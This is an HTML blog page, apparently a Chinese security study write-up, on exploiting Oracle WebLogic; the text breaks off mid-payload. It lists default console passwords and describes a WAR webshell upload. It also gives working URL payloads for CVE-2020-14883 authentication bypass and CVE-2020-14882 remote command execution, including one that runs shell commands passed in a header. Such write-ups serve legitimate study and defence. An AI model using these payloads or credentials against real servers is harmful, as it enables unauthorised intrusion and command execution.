@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Weblogic学习(2) - 6s6&#39;s blog</title><meta name="author" content="6s6">
+<meta name="description" content="description is here"><meta name="keywords" content='Java'>
+  <meta itemprop="name" content="Weblogic学习(2)">
+  <meta itemprop="description" content="description is here">
+  <meta itemprop="datePublished" content="2025-05-11T14:18:30+08:00">
+  <meta itemprop="dateModified" content="2025-05-11T14:18:30+08:00">
+  <meta itemprop="wordCount" content="552">
+  <meta itemprop="keywords" content="Java"><meta property="og:url" content="http://localhost:1313/posts/0846c48/">
+  <meta property="og:site_name" content="6s6&#39;s blog">
+  <meta property="og:title" content="Weblogic学习(2)">
+  <meta property="og:description" content="description is here">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-11T14:18:30+08:00">
+    <meta property="article:modified_time" content="2025-05-11T14:18:30+08:00">
+    <meta property="article:tag" content="Java">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Weblogic学习(2)">
+  <meta name="twitter:description" content="description is here">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/0846c48/" title="Weblogic学习(2) - 6s6&#39;s blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/705d533/" title="Weblogic学习(1)" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/0846c48/index.md" title="Weblogic学习(2) - 6s6's blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Weblogic学习(2)",
+    "inLanguage": "en-us",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/0846c48\/"
+    },"genre": "posts","keywords": "Java","wordcount":  552 ,
+    "url": "http:\/\/localhost:1313\/posts\/0846c48\/","datePublished": "2025-05-11T14:18:30+08:00","dateModified": "2025-05-11T14:18:30+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "6s6"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="6s6&#39;s blog"><span class="typeit"><template>6s6&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/">Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/" title="links">Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/">About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="6s6&#39;s blog"><span class="typeit"><template>6s6&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/">Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/" title="links">Links</a></li><li class="menu-item"><a class="menu-link" href="/about/">About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Weblogic学习(2)</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://bu.dusays.com/2024/12/26/676d23907280d.jpg" alt="6s6" data-title="6s6" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;6s6</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/java/" class="post-category" title="分类 - Java"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Java</a></span></div><div class="post-meta-line"><span title="发布于 2025-05-11 14:18:30"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-05-11">2025-05-11</time></span>&nbsp;<span title="552 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 600 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 3 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#弱口令-getshell">弱口令 getshell</a>
+      <ul>
+        <li><a href="#弱口令">弱口令</a></li>
+        <li><a href="#文件上传">文件上传</a></li>
+      </ul>
+    </li>
+    <li><a href="#cve-2020-14882cve-2020-14883-未授权-rce">CVE-2020-14882/CVE-2020-14883 未授权 RCE</a>
+      <ul>
+        <li><a href="#影响版本">影响版本</a></li>
+        <li><a href="#cve-2020-14883">CVE-2020-14883</a></li>
+        <li><a href="#cve-2020-14882">CVE-2020-14882</a>
+          <ul>
+            <li><a href="#方法一">方法一</a></li>
+            <li><a href="#方法二">方法二</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#cve-2014-4210-ssrf">CVE-2014-4210 SSRF</a>
+      <ul>
+        <li><a href="#影响版本-1">影响版本</a></li>
+        <li><a href="#漏洞复现">漏洞复现</a></li>
+      </ul>
+    </li>
+    <li><a href="#cve-2018-2894-任意文件上传">CVE-2018-2894 任意文件上传</a>
+      <ul>
+        <li><a href="#影响版本-2">影响版本</a></li>
+        <li><a href="#漏洞复现-1">漏洞复现</a></li>
+        <li><a href="#小结">小结</a></li>
+        <li><a href="#参考">参考</a></li>
+      </ul>
+    </li>
+    <li><a href="#cve-2021-2109-weblogic-jndi-注入">CVE-2021-2109 WebLogic JNDI 注入</a>
+      <ul>
+        <li><a href="#环境搭建">环境搭建</a></li>
+        <li><a href="#漏洞分析">漏洞分析</a>
+          <ul>
+            <li><a href="#利用前提">利用前提</a></li>
+            <li><a href="#漏洞分析-1">漏洞分析</a></li>
+            <li><a href="#漏洞修复">漏洞修复</a></li>
+          </ul>
+        </li>
+        <li><a href="#小结-1">小结</a></li>
+        <li><a href="#参考-1">参考</a></li>
+      </ul>
+    </li>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="前言" class="heading-element"><span>前言</span>
+  <a href="#%e5%89%8d%e8%a8%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>相对于前面的反序列化洞，以下几个洞比较简单，就不多加分析了，主要看下怎么打</p>
+<h2 id="弱口令-getshell" class="heading-element"><span>弱口令 getshell</span>
+  <a href="#%e5%bc%b1%e5%8f%a3%e4%bb%a4-getshell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="弱口令" class="heading-element"><span>弱口令</span>
+  <a href="#%e5%bc%b1%e5%8f%a3%e4%bb%a4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>访问 WebLogic <code>/console</code> 接口，可能存在的弱口令如下</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">账户</th>
+          <th style="text-align: center">密码</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">system</td>
+          <td style="text-align: center">password</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">weblogic</td>
+          <td style="text-align: center">weblogic</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">guest</td>
+          <td style="text-align: center">guest</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">portaladmin</td>
+          <td style="text-align: center">portaladmin</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">admin</td>
+          <td style="text-align: center">security</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">joe</td>
+          <td style="text-align: center">password</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">mary</td>
+          <td style="text-align: center">password</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">system</td>
+          <td style="text-align: center">security</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">wlcsystem</td>
+          <td style="text-align: center">wlcsystem</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">wlcsystem</td>
+          <td style="text-align: center">sipisystem</td>
+      </tr>
+  </tbody>
+</table>
+<p>一些弱口令密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">weblogic1  
+</span></span><span class="line"><span class="cl">weblogic12  
+</span></span><span class="line"><span class="cl">weblogic123  
+</span></span><span class="line"><span class="cl">weblogic@123  
+</span></span><span class="line"><span class="cl">webl0gic  
+</span></span><span class="line"><span class="cl">weblogic#  
+</span></span><span class="line"><span class="cl">weblogic@</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里错误密码5次之后就会自动锁定，用 qax 搭建的这个环境的账户密码为：weblogic、qaxateam01</p>
+<h3 id="文件上传" class="heading-element"><span>文件上传</span>
+  <a href="#%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>之后就在左边域结构处的部署那进行文件上传，点击安装后上传文件，随便弄个 jsp 木马，压缩成 zip 后改后缀为 war</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec67314.png" alt="image-20250505155237754" srcset="https://bu.dusays.com/2025/05/11/682043ec67314.png?size=small, https://bu.dusays.com/2025/05/11/682043ec67314.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec67314.png?size=large 2x" data-title="image-20250505155237754" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>将文件传在上面那处</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec733e3.png" alt="image-20250505155306999" srcset="https://bu.dusays.com/2025/05/11/682043ec733e3.png?size=small, https://bu.dusays.com/2025/05/11/682043ec733e3.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec733e3.png?size=large 2x" data-title="image-20250505155306999" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后一直点下一步，最后点完成，之后启动就能 getshell 了</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec68a4e.png" alt="image-20250505155551392" srcset="https://bu.dusays.com/2025/05/11/682043ec68a4e.png?size=small, https://bu.dusays.com/2025/05/11/682043ec68a4e.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec68a4e.png?size=large 2x" data-title="image-20250505155551392" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec62288.png" alt="image-20250505155735480" srcset="https://bu.dusays.com/2025/05/11/682043ec62288.png?size=small, https://bu.dusays.com/2025/05/11/682043ec62288.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec62288.png?size=large 2x" data-title="image-20250505155735480" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="cve-2020-14882cve-2020-14883-未授权-rce" class="heading-element"><span>CVE-2020-14882/CVE-2020-14883 未授权 RCE</span>
+  <a href="#cve-2020-14882cve-2020-14883-%e6%9c%aa%e6%8e%88%e6%9d%83-rce" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>这里 rce 是在未授权的基础上进后台 rce 的，简单地介绍下两个漏洞</p>
+<ul>
+<li>CVE-2020-14883：允许未授权的用户通过目录穿越结合双重 URL 编码的方式来绕过管理控制台的权限验证访问后台。</li>
+<li>CVE-2020-14882：允许后台任意用户通过 HTTP 协议执行任意命令。</li>
+</ul>
+<h3 id="影响版本" class="heading-element"><span>影响版本</span>
+  <a href="#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0</p>
+<h3 id="cve-2020-14883" class="heading-element"><span>CVE-2020-14883</span>
+  <a href="#cve-2020-14883" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>直接访问 console 会跳转到 /console/login/LoginForm.jsp 进行登录，这里可以利用双重 url 编码+目录穿越进 console 后台，payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/console/css/%252e%252e%252fconsole.portal</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进去后很明显和之前弱口令进去的后台不一样，没有部署，无法上传恶意 war 包来拿 shell，接下来可以结合 CVE-2020-14882 来 getshell</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682043ec9f880.png" alt="image-20250505172412953" srcset="https://bu.dusays.com/2025/05/11/682043ec9f880.png?size=small, https://bu.dusays.com/2025/05/11/682043ec9f880.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682043ec9f880.png?size=large 2x" data-title="image-20250505172412953" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="cve-2020-14882" class="heading-element"><span>CVE-2020-14882</span>
+  <a href="#cve-2020-14882" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在上述未授权进入的后台是低权限的情况下，可以利用 CVE-2020-14883 来打，有两种打法，一是用 <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> 来直接 rce，二是用 <code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code> 加载恶意 xml 文件来 rce</p>
+<h4 id="方法一" class="heading-element"><span>方法一</span>
+  <a href="#%e6%96%b9%e6%b3%95%e4%b8%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>利用的是 <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> 类</p>
+<p>此利用方法只能在 Weblogic 12.2.1 及以上版本利用，因为低版本并不存在 <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> 类</p>
+<p>payload1</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/pocIsok%27);%22);</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload2</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/console/css/%252e%252e%252fconsole.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\A%22).next();%20weblogic.servlet.internal.S